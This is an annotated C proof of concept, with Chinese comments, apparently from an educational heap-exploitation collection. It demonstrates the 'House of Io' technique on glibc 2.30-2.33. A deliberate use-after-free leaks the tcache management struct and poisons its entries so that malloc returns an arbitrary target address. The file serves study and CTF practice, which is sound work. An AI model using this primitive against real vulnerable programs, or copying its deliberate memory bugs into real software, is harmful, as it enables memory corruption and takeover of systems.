/*
 * 中文导读：本文件对应 house_of_io 手法，标注的版本范围是 2.30～2.33。
 * 模拟的漏洞是能把 tcache_perthread_struct 本身当作一个已释放的
 * tcache chunk 来操作；核心流程是通过它未加密的 entries 字段取得任意
 * 分配，这本质上是早期 safe-linking 留下的一条无需地址泄露的旁路。
 * 成功判据是 malloc 返回目标地址 target；2.34 把 tcache_key 改成随机值
 * 并调整了布局与初始化逻辑，使这份原始 PoC 失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// House of Io：释放后使用（UAF）变体
//
// 原始资料：https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
//
// 本程序在 glibc 2.30、2.31、2.32 与 2.33 上验证过。
//
// 这个手法利用的是早期 tcache 的一个关键事实：chunk 释放进 tcache 之后，
// 用户区第二个机器字会被写入 tcache 管理结构的地址，也就是
// tcache_entry->key。攻击者只要能在释放之后读写这个字段，就能拿到
// tcache_perthread_struct 的地址。即使 2.32 已经启用了 safe-linking，
// 这个 key 字段以及管理结构里的 entries 数组仍然没有编码，所以还是可以
// 直接利用。
//
// 原始的 House of Io 只适用于 glibc 2.29～2.33：这些版本会把
// tcache_entry->key 直接设成管理结构的指针。拿到这个地址之后，就能
// 覆盖 counts 和 entries，完成对 tcache 元数据的投毒，让指定尺寸的
// 下一次 malloc 返回攻击者选定的地址。
//
// 需要注意，原文讨论的前置原语要求比较苛刻：向低地址方向的负溢出并不
// 常见，双重释放这个变体还要求特定的释放顺序。这里采用的是更贴近常见
// CTF 漏洞模型的释放后使用（UAF）变体。

/*
 * 2.32 起 tcache_get 会检查取出的 entry 是否按 MALLOC_ALIGNMENT 对齐，
 * 因此任意分配目标不能再随便落在一个 8 字节对齐的全局变量上。
 * 这里显式做 0x10 对齐；它的第一个机器字还会在下方初始化为
 * PROTECT_PTR(&global_var, NULL)，供 safe-linking 版本解码 next 使用。
 */
unsigned long global_var __attribute__((aligned(16)));

struct overlay {
  uint64_t *next;
  uint64_t *key;
};

struct tcache_perthread_struct {
  uint16_t counts[64];
  uint64_t entries[64];
};

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /*
   * 2.32/2.33 的 REVEAL_PTR(e->next) 要求伪造的 entry 首字表示编码后的
   * NULL，也就是要满足：
   *     PROTECT_PTR(&e->next, NULL) == (uintptr_t)&e->next >> 12
   * 2.30/2.31 还没启用 safe-linking，它们虽然也会把这个值当成普通的
   * next 来处理，但因为本次取出之后 count 已经归零，不会继续消费这条
   * 伪链，所以同一份写法在两个分支上都能兼容。
   */
  global_var = (uintptr_t)&global_var >> 12;

  struct overlay *ptr = malloc(sizeof(struct overlay));

  ptr->next = malloc(0x10);
  ptr->key = malloc(0x10);

  free(ptr);

  struct tcache_perthread_struct *management_struct =
      (struct tcache_perthread_struct *)ptr->key;

  management_struct->counts[0] = 1;

  management_struct->entries[0] = (uint64_t)&global_var;

  uint64_t *evil_chunk = malloc(0x10);

  assert(evil_chunk == &global_var);
  return 0;
}
